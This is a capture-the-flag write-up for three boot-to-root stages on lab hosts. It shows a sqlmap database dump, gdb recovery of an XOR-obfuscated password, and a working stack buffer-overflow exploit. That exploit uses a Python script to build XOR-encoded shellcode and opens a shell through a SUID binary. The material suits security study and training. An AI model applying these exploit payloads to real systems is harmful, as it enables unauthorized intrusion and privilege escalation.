# B2R lillenisse
After registering a user and logging in, we get a whishes list.
Running sqlmap, with our own PHPSESSION cookie:
```
sqlmap -u http://10.10.180.155/index.php --forms --dump --cookie "PHPSESSID=o1tbunpcbdtlo2el4cfle467p5" --dbms=mysql
```
This reveals an entry in the table `nisser`:
```
nc3{jeg_er_ikke_til_at_finde}
```

# B2R mellemnisse
From the previous SQLi we got an entry in the table `ønskeseddel`:
`Noget magi til at f rdigg re mit kodeprojekt p  /nissetestprojekt2020` and it seems like we should check it out.
Going to the URL shows a button `Gå i DEV mode`, pressing it sends the query:
```
POST /nissetestprojekt2020/index.php HTTP/1.1
Host: 10.10.90.117
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.90.117/nissetestprojekt2020/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close
Upgrade-Insecure-Requests: 1

dev_mode=disable_firewall
```
Running an nmap scan afterwards shows:
```
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
4545/tcp open  worldscores?
8080/tcp open  http         SimpleHTTPServer 0.6 (Python 3.5.2)
```
Going to the service hosted on 8080 reveals a .elf called nisseadgang.elf
Running this exposes a service on 4545. Must be the same as the one running on our host.

Decompiling it reveals the function `ErKodeordKorrekt` with the code:
```
undefined8 ErKodeordKorrekt(char const*)(char *arg1)
{
    int64_t iVar1;
    undefined8 uVar2;
    char *s;
    int64_t var_2h;

    // ErKodeordKorrekt(char const*)
    iVar1 = strlen(arg1);
    if (iVar1 == 0x1b) {
        var_2h._1_1_ = 0;
        while (var_2h._1_1_ < 0x1b) {
            if ((code)(arg1[var_2h._1_1_] + '\x01') != g_flagEncrypted[(int32_t)((uint32_t)var_2h._1_1_ * 2)]) {
                return 0;
            }
            var_2h._1_1_ = var_2h._1_1_ + 1;
        }
        uVar2 = 1;
    } else {
        uVar2 = 0;
    }
    return uVar2;
}

```
From this we can see that the password must be of length 27 and is stored in the array g_flagEncrypted.
However the "encryption" is the 0x01 is added to every character and that we should only look at every second
entry in the array.
Launching the program with gdb:
```
gdb nisseadgang.elf
```
We can set a break point for the function ErKodeordKorrekt:
```
(gdb) break ErKodeordKorrekt
```
If we then run the program
```
(gdb) run
Starting program: /tmp/nisseadgang.elf

```
and connect to it from a different terminal and enter a 27 character password we get:
```
kali@kali:~$ nc localhost 4545
Nissernes indgang
---------------------------------
Kodeord: AAAAAAAAAAAAAAAAAAAAAAAAAA
```
```
Breakpoint 1, 0x000055555555520d in ErKodeordKorrekt(char const*) ()
(gdb)
```
We can now try to inspect the flag array:
```
(gdb) info variables g_flagEncrypted
All variables matching regular expression "g_flagEncrypted":

Non-debugging symbols:
0x0000555555556020  g_flagEncrypted
```
Looking at the memory at that address we get:
```
(gdb) x/54xb 0x555555556020
0x555555556020 <_ZL15g_flagEncrypted>:  0x6f    0x03    0x64    0x03    0x34    0x03    0x7c    0x03
0x555555556028 <_ZL15g_flagEncrypted+8>:        0x62    0x03    0x63    0x03    0x73    0x03    0x62    0x03
0x555555556030 <_ZL15g_flagEncrypted+16>:       0x6c    0x03    0x62    0x03    0x65    0x03    0x62    0x03
0x555555556038 <_ZL15g_flagEncrypted+24>:       0x63    0x03    0x73    0x03    0x62    0x03    0x60    0x03
0x555555556040 <_ZL15g_flagEncrypted+32>:       0x6d    0x03    0x76    0x03    0x6c    0x03    0x60    0x03
0x555555556048 <_ZL15g_flagEncrypted+40>:       0x65    0x03    0x6a    0x03    0x68    0x03    0x60    0x03
0x555555556050 <_ZL15g_flagEncrypted+48>:       0x70    0x03    0x71    0x03    0x7e    0x03
```
After cleaning it up, we can break the "encryption", by removed every second element (all the `0x03`) and
subtracting `0x01` from the rest. We then get:
```
0x6e 0x63 0x33 0x7b    
0x61 0x62 0x72 0x61    
0x6b 0x61 0x64 0x61    
0x62 0x72 0x61 0x5f    
0x6c 0x75 0x6b 0x5f    
0x64 0x69 0x67 0x5f    
0x6f 0x70 0x7d
```
Converting from hex to ascii we get:
```
nc3{abrakadabra_luk_dig_op}
```

# B2R storenisse
Logging in to the service grants us a shell
```
nc 10.10.92.243 4545
Nissernes indgang
---------------------------------
Kodeord: nc3{abrakadabra_luk_dig_op}
 ... ok
>
```
We discover an executable in the dir `/home/storenisse` called `import_ønsker.elf` which has it's SUID bit set.
Interesting, this makes us able to run code as `storenisse` if we can find an exploit.
Luckly the server has `python3` installed so we can download the elf by setting up a http server.
On server:
```
cd /home/storenisse
python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 ...
```
On client:
```
wget http://10.10.92.243:8000/import_ønsker.elf
```

Decompiling it shows us tons of loaded libraries and a couple of interesting functions:
main():
```
bool main(int32_t param_1, int32_t param_2)
{
    int32_t var_ch;

    puts(":: Import af ønsker - Copyright (c) 2020 Nisseværkstedet");
    puts(".................................................................>");
    if (param_1 < 2) {
        puts("- Mangler et ønske som parameter!");
    } else {
        DoImport(char const*)(*(undefined4 *)(param_2 + 4));
    }
    return param_1 < 2;
}
```
DoImport():
```
void DoImport(char const*)(undefined4 param_1)
{
    uint32_t uVar1;
    undefined4 auStack44 [11];

    // DoImport(char const*)
    uVar1 = 0;
    do {
        *(undefined4 *)((int32_t)auStack44 + uVar1) = 0;
        uVar1 = uVar1 + 4;
    } while (uVar1 < 0x20);
    .plt(auStack44, param_1);
    Process(SWish&)();
    return;
}
```
Process():
```
void __regparm3 Process(SWish&)(uint8_t *param_1)
{
    uint8_t *puVar1;
    int32_t arg_14h;
    int32_t iVar2;

    // Process(SWish&)
    puVar1 = param_1;
    do {
        *puVar1 = *puVar1 ^ 0x40;
        puVar1 = puVar1 + 1;
    } while (puVar1 != param_1 + 0x20);
    arg_14h = _IO_new_fopen("nye_ønsker.wishes.encrypted", 0x80b2008);
    iVar2 = strlen(param_1);
    iVar2 = _IO_fwrite((int32_t)param_1, iVar2, 1, arg_14h);
    if (iVar2 != 1) {
        func_0x086982df();
    }
    _IO_fclose(arg_14h);
    return;
}
```

Process(): is quite interesting. It saves the program arguments to an "encrypted" file. Luckily we
can see that the encryption is just XOR'ing the first 32 bytes with 0x40.

Running the program through gdb:
```
env - gdb /home/storenisse/import_ønsker.elf

(gdb) r $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*47+b"\x42")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/storenisse/import_ønsker.elf $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*47+b"\x42")')
:: Import af ønsker - Copyright (c) 2020 Nisseværkstedet
.................................................................>

Program received signal SIGSEGV, Segmentation fault.
0x42414141 in ?? ()
```
So we can overwrite `$eip`
If we break at Process we see that:
```
(gdb) break Process
Breakpoint 1 at 0x8049d90
(gdb) r $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*47+b"\x42")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/storenisse/import_ønsker.elf $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*47+b"\x42")')
:: Import af ønsker - Copyright (c) 2020 Nisseværkstedet
.................................................................>

Breakpoint 1, 0x08049d90 in Process(SWish&) ()
(gdb) s
Single stepping until exit from function _ZL7ProcessR5SWish,
which has no line number information.
0x08049e1d in DoImport(char const*) ()
(gdb) x/260bx $esp
0xffffdd60:     0x01    0x01    0x01    0x01    0x01    0x01    0x01    0x01
0xffffdd68:     0x01    0x01    0x01    0x01    0x01    0x01    0x01    0x01
0xffffdd70:     0x01    0x01    0x01    0x01    0x01    0x01    0x01    0x01
0xffffdd78:     0x01    0x01    0x01    0x01    0x01    0x01    0x01    0x01
0xffffdd80:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffdd88:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x42
0xffffdd90:     0x00    0xdf    0xff    0xff    0x74    0xde    0xff    0xff
0xffffdd98:     0x80    0xde    0xff    0xff    0x89    0xac    0x04    0x08
0xffffdda0:     0x38    0x2b    0x0e    0x08    0xc8    0x81    0x04    0x08
0xffffdda8:     0x00    0x00    0x00    0x00    0xd0    0xdd    0xff    0xff
0xffffddb0:     0x38    0x2b    0x0e    0x08    0x38    0x2b    0x0e    0x08
0xffffddb8:     0x00    0x00    0x00    0x00    0x58    0xa6    0x04    0x08
0xffffddc0:     0x38    0x2b    0x0e    0x08    0x38    0x2b    0x0e    0x08
0xffffddc8:     0x38    0x2b    0x0e    0x08    0x58    0xa6    0x04    0x08
0xffffddd0:     0x02    0x00    0x00    0x00    0x74    0xde    0xff    0xff
0xffffddd8:     0x80    0xde    0xff    0xff    0x14    0xde    0xff    0xff
0xffffdde0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffdde8:     0x00    0x00    0x00    0x00    0x38    0x2b    0x0e    0x08
0xffffddf0:     0x06    0x00    0x00    0x00    0x3c    0x00    0x00    0x00
0xffffddf8:     0x03    0x00    0x00    0x00    0x30    0x00    0x00    0x00
0xffffde00:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffde08:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffde10:     0x00    0x00    0x00    0x00    0x38    0x2b    0x0e    0x08
0xffffde18:     0x38    0x2b    0x0e    0x08    0xc8    0x81    0x04    0x08
0xffffde20:     0x00    0x00    0x00    0x00    0x55    0x0e    0x2b    0x66
0xffffde28:     0xba    0x8d    0xdc    0x90    0x00    0x00    0x00    0x00
0xffffde30:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffde38:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffde40:     0x38    0x2b    0x0e    0x08    0x02    0x00    0x00    0x00
0xffffde48:     0x00    0x00    0x00    0x00    0x42    0x9c    0x04    0x08
0xffffde50:     0x00    0x97    0x04    0x08    0x02    0x00    0x00    0x00
0xffffde58:     0x74    0xde    0xff    0xff    0x30    0xac    0x04    0x08
0xffffde60:     0xd0    0xac    0x04    0x08
```
We notice the `0x01` in the beginning. Those are the result of the XOR `0x40` from earlier `chr(A)=0x41` and
`0x41 XOR 0x40 = 0x01`.
So if we find some shell code to execute we need to XOR the first 32 byte with `0x40`.
Finding some shellcode online that spawns a shell is quite easy. After preparing it by XOR'ing by 0x40
We point the last 4 byte to the beginning of our stack.
To test different payloads I wrote this script:
```
import os
shellcode = b"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
offset = b"\x60\xdd\xff\xff" #Reversed cause stacks are weird
nopslide = b"\x90"*19 # Multiplier needs to be changed with other payloads
payload = bytearray(shellcode + nopslide + offset)
for i in range(0,32):
	payload[i] = payload[i]^0x40
print("$(python3 -c \'import sys; sys.stdout.buffer.write(b\"" + ''.join(['\\' + hex(x)[1:] for x in bytearray(payload)]) + "\")\')")
```

This gives the output:
```
$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd9\xb7\xa2\xcd\x48\xfe\x6f\x6f\x33\x28\xff\x6f\x22\x29\x2e\x11\x16\x17\xcd\x5c\x64\xf0\x4b\x8d\xc0\xd0\xd0\xd0\xd0\xd0\xd0\xd0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\xdd\xff\xff")')
```

Running it in gdb grants us a shell:
```
<0\xd0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\xdd\xff\xff")')
Starting program: /home/storenisse/import_ønsker.elf $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd9\xb7\xa2\xcd\x48\xfe\x6f\x6f\x33\x28\xff\x6f\x22\x29\x2e\x11\x16\x17\xcd\x5c\x64\xf0\x4b\x8d\xc0\xd0\xd0\xd0\xd0\xd0\xd0\xd0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\xdd\xff\xff")')
:: Import af ønsker - Copyright (c) 2020 Nisseværkstedet
.................................................................>
process 1474276 is executing new program: /usr/bin/dash
$
```
